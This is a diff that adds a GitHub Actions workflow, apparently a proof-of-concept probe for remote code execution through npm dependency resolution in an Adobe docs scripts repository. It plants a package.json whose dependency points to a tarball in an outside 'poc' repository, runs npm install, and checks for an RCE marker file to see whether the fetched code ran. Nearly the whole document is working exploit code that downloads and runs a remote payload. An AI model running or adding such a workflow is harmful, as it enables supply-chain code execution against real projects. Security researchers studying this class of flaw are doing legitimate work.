@@ -1,0 +1,28 @@
+name: npmprobe3
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+permissions:
+  pull-requests: write
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: versions
+        run: node -v; npm -v
+
+      - name: F direct https tarball dependency in planted package.json
+        run: |
+          rm -rf "$RUNNER_TEMP/f" && mkdir -p "$RUNNER_TEMP/f" && cd "$RUNNER_TEMP/f"
+          rm -f /tmp/ADP_RCE_MARKER
+          cat > package.json <<'JSON'
+          {"name":"f","version":"1.0.0","private":true,
+           "dependencies":{"gray-matter":"https://raw.githubusercontent.com/PDFtoMark/gab-poc-npmreg/main/v2/gray-matter-4.0.5.tgz"}}
+          JSON
+          npm install --no-save github:AdobeDocs/adp-devsite-scripts > f.log 2>&1 || echo NPM_EXIT_NONZERO
+          tail -12 f.log
+          ls node_modules 2>/dev/null
+          echo "----- marker"; cat /tmp/ADP_RCE_MARKER 2>/dev/null || echo NO_MARKER
+          if [ -f /tmp/ADP_RCE_MARKER ]; then echo RESULT_F=RAN; else echo RESULT_F=BLOCKED; fi
